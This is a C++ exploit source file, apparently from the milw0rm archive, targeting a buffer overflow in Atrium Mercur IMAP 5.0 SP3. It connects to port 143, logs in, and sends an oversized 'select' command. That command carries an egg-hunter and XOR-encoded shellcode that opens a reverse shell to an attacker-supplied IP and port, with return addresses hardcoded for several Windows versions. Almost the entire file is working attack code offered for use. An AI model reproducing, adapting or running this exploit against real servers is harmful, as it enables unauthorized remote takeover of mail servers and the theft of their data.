/*
 * mercur.cpp
 *
 * Atrium Mercur IMAP 5.0 SP3 Messaging Multiple IMAP Commands Remote Exploit
 * Copyright (C) 2006 Javaphile Group
 * http://www.javaphile.org
 *
 * Exploits code by : pll Ellison.Tang[at]gmail[dot]com
 *
 * Bug Reference:
 * http://www.frsirt.com/bulletins/4332
 *
 */

#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32")

SOCKET ConnectTo(char *ip, int port)
{
	WSADATA	wsaData;
	SOCKET	s;
	struct	hostent		*he;
	struct	sockaddr_in	host;
	int		nTimeout=150000;

	if(WSAStartup(MAKEWORD(1,1),&wsaData)!=0)
	{
		printf("[-]WSAStartup failed.\n");
		exit(-1);
	}

	if((he=gethostbyname(ip))==0)
	{
		printf("[-]Failed to resolve '%s'.", ip);
		exit(-1);
	}

	host.sin_port=htons(port);
	host.sin_family=AF_INET;
	host.sin_addr=*((struct in_addr *)he->h_addr);

	if ((s=socket(AF_INET,SOCK_STREAM,0))<0)
	{
		printf("[-]Failed creating socket.");
 		exit(-1);
 	}

	if ((connect(s,(struct sockaddr *)&host,sizeof(host)))==-1)
	{
		closesocket(s);
		printf("[-]Failed connecting to host.\n");
		exit(-1);
	}
	setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char*)&nTimeout,sizeof(nTimeout));
	return s;
}


void Disconnect(SOCKET s)
{
	closesocket(s);
	WSACleanup();
}

void PrintSc(unsigned char *sc, int len)
{
    int    i,j;
    char *p;
    char msg[6];

    //printf("/* %d bytes */\n", buffsize);

    // Print general shellcode
    for(i = 0; i < len; i++)
    {
        if((i%16)==0)
        {
            if(i!=0)
                printf("\"\n\"");
            else
                printf("\"");
        }

        //printf("\\x%.2X", sc[i]);

        sprintf(msg, "\\x%.2X", sc[i] & 0xff);

        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                printf("%c", _tolower(*p));
            else
                printf("%c", p[0]);
        }
    }

    printf("\";\n");
}

void main(int argc,char* argv[])
{

	struct OSTYPE
	{
		unsigned int ret;
		char des[255];
	};

	OSTYPE os[] = {
		{0x7FFA4512, "CN Windows ALL 0x7FFA4512"},
		{0x7801f4fb, "Windows 2k SP4 0x7801f4fb"},
		{0xDDDDDDDD, "Debug"},
		{0, NULL}
	};

	unsigned char shellcode[]=
	/* ip offset: 71 + 21 = 92 */
	/* port offset: 78 + 21 = 99 */
	/* 21 bytes decode */
	"\xeb\x0e\x5b\x4b\x33\xc9\xb1\xfe\x80\x34\x0b\xee\xe2\xfa\xeb\x05"
	"\xe8\xed\xff\xff\xff"
	/* 254 bytes shellcode, xor with 0xee */
	"\x07\x36\xee\xee\xee\xb1\x8a\x4f\xde\xee\xee\xee\x65\xae\xe2\x65"
	"\x9e\xf2\x43\x65\x86\xe6\x65\x19\x84\xea\xb7\x06\x96\xee\xee\xee"
	"\x0c\x17\x86\xdd\xdc\xee\xee\x86\x99\x9d\xdc\xb1\xba\x11\xf8\x7b"
	"\x84\xed\xb7\x06\x8e\xee\xee\xee\x0c\x17\xbf\xbf\xbf\xbf\x84\xef"
	"\x84\xec\x11\xb8\xfe\x7d\x86"
	"\x91\xee\xee\xef"				//ip
	"\x86"
	"\xec\xee"
	"\xee\xdb"						//port
	"\x65\x02\x84\xfe\xbb\xbd\x11\xb8\xfa\x6b\x2e\x9b\xd6\x65\x12\x84"
	"\xfc\xb7\x45\x0c\x13\x88\x29\xaa\xca\xd2\xef\xef\x7d\x45\x45\x45"
	"\x65\x12\x86\x8d\x83\x8a\xee\x65\x02\xbe\x63\xa9\xfe\xb9\xbe\xbf"
	"\xbf\xbf\x84\xef\xbf\xbf\xbb\xbf\x11\xb8\xea\x84\x11\x11\xd9\x11"
	"\xb8\xe2\x11\xb8\xf6\x11\xb8\xe6\xbf\xb8\x65\x9b\xd2\x65\x9a\xc0"
	"\x96\xed\x1b\xb8\x65\x98\xce\xed\x1b\xdd\x27\xa7\xaf\x43\xed\x2b"
	"\xdd\x35\xe1\x50\xfe\xd4\x38\x9a\xe6\x2f\x25\xe3\xed\x34\xae\x05"
	"\x1f\xd5\xf1\x9b\x09\xb0\x65\xb0\xca\xed\x33\x88\x65\xe2\xa5\x65"
	"\xb0\xf2\xed\x33\x65\xea\x65\xed\x2b\x45\xb0\xb7\x2d\x06\xcd\x11"
	"\x11\x11\x60\xa0\xe0\x02\x9c\x10\x5d\xf8\x01\x20\x0e\x8e\x43\x37"
	"\xeb\x20\x37\xe7\x1b\x43\x02\x17\x44\x8e\x09\x97\x28\x97";

	unsigned char FindSc[]=
	"\x8B\xCC\x80\xE9\x3E\x8B\xF1\x33\xC0\x40\xC1\xE0\x0A\x04\x80\x8B"
	"\xF8\x57\x33\xC9\xB1\x3E\xF3\xA4\x5F\xFF\xE7\x8B\xC7\x04\x28\x50"
	"\x33\xC0\x50\x64\x89\x20\xBA\x41\x47\x4F\x55\x33\xFF\x3B\x17\x74"
	"\x03\x47\xEB\xF9\x83\xC7\x04\x3B\x17\x74\x03\x47\xEB\xEF\x83\xC7"
	"\x04\x57\xC3\x8B\x54\x24\x0C\x33\xC0\xB4\x10\x33\xDB\xB3\x9C\x01"
	"\x04\x13\x33\xC0\xC3"
	"\x90\x90\x90\x90"
	"\xEB\xA5";


	if(argc < 5)
	{
		printf("Mercur IMAPD 5.0 SP3 Remote Exploit\n");
		printf("-------------------------------------------\n");
		printf("Usage:\n");
		printf("   %s <Victim> <Connect back IP> <Connect back Port> <OsType>\n", argv[0]);
		printf("\nType could be:\n");

		int i=0;
		while(os[i].ret)
		{
			printf(" [%d]  %s\n", i, os[i].des);
			i++;
		}
		return;
	}

	SOCKET	s=ConnectTo(argv[1],143);

	printf("[+]Connected to target...");

	char szRecvBuff[600] = {0};

	if(recv(s,szRecvBuff,sizeof(szRecvBuff),0)<=0)
	{
		printf("failed!\n");
		return;
	}
	else
	{
		printf("done!\n");
	}

//	printf("%s\n",szRecvBuff);

	if(strstr(szRecvBuff, "MERCUR") == NULL)
	{
		printf("[-]Seems not IMAP running.\n");
		printf("Quiting...");
		return;
	}
	else
	{
		printf("[*]Seems IMAP running.\n");
	}

	unsigned long dwCbIp=inet_addr(argv[2]);

	unsigned short q=(unsigned short)atoi(argv[3]);
	unsigned short dwCbPort=(unsigned short)q;

	dwCbIp=dwCbIp^0xEEEEEEEE;
	dwCbPort=dwCbPort^0xEEEE;

	shellcode[92] =(char) (dwCbIp & 0x000000FF);
	shellcode[93] =(char) ((dwCbIp & 0x0000FF00)>>8);
	shellcode[94] =(char) ((dwCbIp & 0x00FF0000)>>16);
	shellcode[95] =(char) ((dwCbIp & 0xFF000000)>>24);

	shellcode[99] =(char) ((dwCbPort & 0x0000FF00)>>8);
	shellcode[100] =(char) (dwCbPort & 0x000000FF);

	char	szUserName[20]={0};
	printf("[?]Username:");
	gets(szUserName);

	char	szPassWord[20]={0};
	printf("[?]Passwd:");
	gets(szPassWord);

	char	szLogin[]=" login ";
	char	szLoginInfo[50]={0};
	unsigned char	szSpace=0x20;
	char szEnd[]="\r\n";

	memcpy(szLoginInfo,szUserName,lstrlen(szUserName));
	int		dwLen=lstrlen(szUserName);
	memcpy(szLoginInfo+dwLen,szLogin,lstrlen(szLogin));
	dwLen+=lstrlen(szLogin);
	memcpy(szLoginInfo+dwLen,szPassWord,lstrlen(szPassWord));
	dwLen+=lstrlen(szPassWord);
	memcpy(szLoginInfo+dwLen,&szSpace,1);
	dwLen++;
	memcpy(szLoginInfo+dwLen,szPassWord,lstrlen(szPassWord));
	dwLen+=lstrlen(szPassWord);
	memcpy(szLoginInfo+dwLen,szEnd,lstrlen(szEnd));

//	printf("%s\n",szLoginInfo);

	printf("[+]Sending Login Info...");

	send(s,szLoginInfo,lstrlen(szLoginInfo),0);

	if(recv(s,szRecvBuff,sizeof(szRecvBuff),0)<=0)
	{
		printf("failed!\n");
		return;
	}
	else
	{
		printf("done!\n");
	}

//	printf("%s\n",szRecvBuff);

	if(strstr(szRecvBuff, "OK") == NULL)
	{
		printf("[-]Seems not a valid user or not support IMAP.\n");
		printf("Quiting...");
		return;
	}
	else
	{
		printf("[*]Seems a valid user.\n");
	}

	char	szSelect[]=" select ";
	char	szMagicData[1000]={0};

	memset(szMagicData,'A',sizeof(szMagicData)-1);
	memcpy(szMagicData,szUserName,lstrlen(szUserName));
	memcpy(szMagicData+lstrlen(szUserName),szSelect,sizeof szSelect-1);

	int p=atoi(argv[4]);
	*(unsigned int *)&FindSc[85] = os[p].ret;

	memcpy(szMagicData+251-sizeof FindSc+1,FindSc,sizeof FindSc-1);

	memcpy(szMagicData+251,szEnd,sizeof szEnd-1);

	char	szAdog[]="AGOU";
	memcpy(szMagicData+253,szAdog,sizeof szAdog-1);
	memcpy(szMagicData+257,szAdog,sizeof szAdog-1);
	memcpy(szMagicData+261,shellcode,sizeof shellcode-1);

	memcpy(szMagicData+sizeof szMagicData-sizeof szEnd,szEnd,sizeof szEnd-1);

	printf("[+]Sending Magic Data To server...Good Luck!\n");
	send(s,szMagicData,sizeof szMagicData-1,0);

	recv(s,szRecvBuff,sizeof(szRecvBuff),0);
	printf("%s\n",szRecvBuff);

	Disconnect(s);
	printf("[?]Sending finished...Good luck!\n");
}

// milw0rm.com [2006-03-19]
